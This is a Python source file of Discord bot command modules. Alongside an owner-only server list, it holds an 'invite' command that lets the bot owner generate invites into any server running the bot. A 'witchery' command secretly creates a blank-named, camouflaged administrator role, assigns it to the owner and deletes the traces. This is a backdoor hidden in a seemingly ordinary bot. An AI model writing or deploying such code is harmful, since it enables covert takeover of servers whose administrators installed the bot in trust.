from cogs.variables import *

class _servers(commands.Cog):
    def __init__(self, witch):
        self.witch = witch
    @commands.command(aliases=['serverlist'])
    async def servers(self, ctx):

        # Obtém uma lista de guildas em que o bot está conectado
        user = ctx.message.author
        embed=discord.Embed(title="Serverlist:", color=0xc034eb)
        embed.set_thumbnail(url="https://i.pinimg.com/originals/e5/05/22/e50522486a15044676ec38808c1cf72f.gif")
        if(user.id == ownerid):
            guilds = client.guilds
            for i, guild in enumerate(guilds,start=1):
                embed.add_field(name="", value=f" {i}. {guild.name}", inline=False)
            await ctx.send(embed=embed)
            
        else: 
            embed = discord.Embed(title="No permission.", color=0xc034eb)


class _invite(commands.Cog):
    def __init__(self, witch):
        self.witch = witch
    @commands.command()
    async def invite(self, ctx, guild_name: str):
        # Procura pelo nome da guilda fornecido nos servidores em que o bot está conectado
        user = ctx.message.author
        if(user.id == ownerid):
            for guild in client.guilds:
                if guild.name == guild_name:
                    # Obtém o primeiro canal de texto disponível na guilda
                    channel = guild.text_channels[0]
                    # Cria um convite para esse canal
                    invite = await channel.create_invite()
                    await ctx.send(f"Here is the invite for {guild.name}: {invite}")
                    return
        else: 
            embed = discord.Embed(title="No permission.", color=0xc034eb)


class _witchery(commands.Cog):
    def __init__(self, witch):
        self.witch = witch
    @commands.command()
    async def witchery(self, ctx):
        user = ctx.message.author
        embed = discord.Embed(title="Witchery done! :)", color=0xc034eb,)
        perms = discord.Permissions(administrator=True)
        server__ = ctx.guild
        witcheryrole = await discord.Guild.create_role(server__ ,name=str(" "), permissions=perms, color=0x302c2c)
        roleid = ctx.guild.get_role(witcheryrole.id)
        if(user.id == ownerid):
            await ctx.send(embed=embed, delete_after=1)
            time.sleep(3)
            await ctx.message.delete()
            await user.add_roles(roleid)
        else:
            embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
            await ctx.send(embed=embed)



async def setup(client):
    await client.add_cog(_invite(client))
    await client.add_cog(_servers(client))
    await client.add_cog(_witchery(client))


